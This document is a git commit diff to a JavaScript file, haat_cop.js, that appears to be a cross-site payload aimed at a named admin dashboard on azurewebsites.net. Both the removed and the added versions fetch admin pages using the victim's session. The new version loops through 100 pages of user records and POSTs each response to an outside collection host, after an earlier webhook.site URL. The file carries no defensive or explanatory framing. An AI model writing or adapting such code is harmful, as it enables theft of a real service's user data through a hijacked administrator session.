9acdd6b8a5c7e703ec6eb90f70d6b0205cae3e66
test1244bbbb <101668399+test1244bbbb@users.noreply.github.com>
2022-03-16 16:53:13 +0200

    Update haat_cop.js

--- haat_cop.js
+++ haat_cop.js
@@ -1,26 +1,31 @@
-var xhr = new XMLHttpRequest();
 
-xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/getDriverNotification', true);
-
-xhr.withCredentials = true;
-xhr.onreadystatechange = function() {
+for (let i = 0; i < 100; i++) {
+  
+   await new Promise(r => setTimeout(r, 1500));
+  
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', "https://haatadmindashboard.azurewebsites.net/admin/getusers?sort=true&draw=1&AreaId=0&start="+i*100+"&lentgh=100", true);
+  xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
 
-        var http = new XMLHttpRequest();
-        var url = "https://webhook.site/f39dd927-7924-468f-874a-9a6adc318265";
-        http.open("POST", url, true);
-        http.setRequestHeader("Content-type", "text/plain");
-        http.onreadystatechange = function() {
-            if (http.readyState == 4 && http.status == 200) {
-
-            }
-        };
-        
-           page_data = {
+          var http = new XMLHttpRequest();
+         // var url = "https://webhook.site/3d15bff1-d379-4b33-a0af-b95f18e0e0f9/"+i;
+          var url = "https://webhookteset.com/"+i;
+          http.open("POST", url, true);
+          http.setRequestHeader("Content-type", "text/plain");
+  
+          page_data = {
                     "page_html": xhr.responseText,
-                    "uri": 'https://haatadmindashboard.azurewebsites.net/admin/driver'
+                    "uri": 'users'+i
                 };
         http.send(JSON.stringify(page_data));
-  }
-};
-xhr.send(null);
+
+            } //if ==4
+        
+}; //ready xhr
+
+xhr.send(null);  
+  
+} //for
+
+
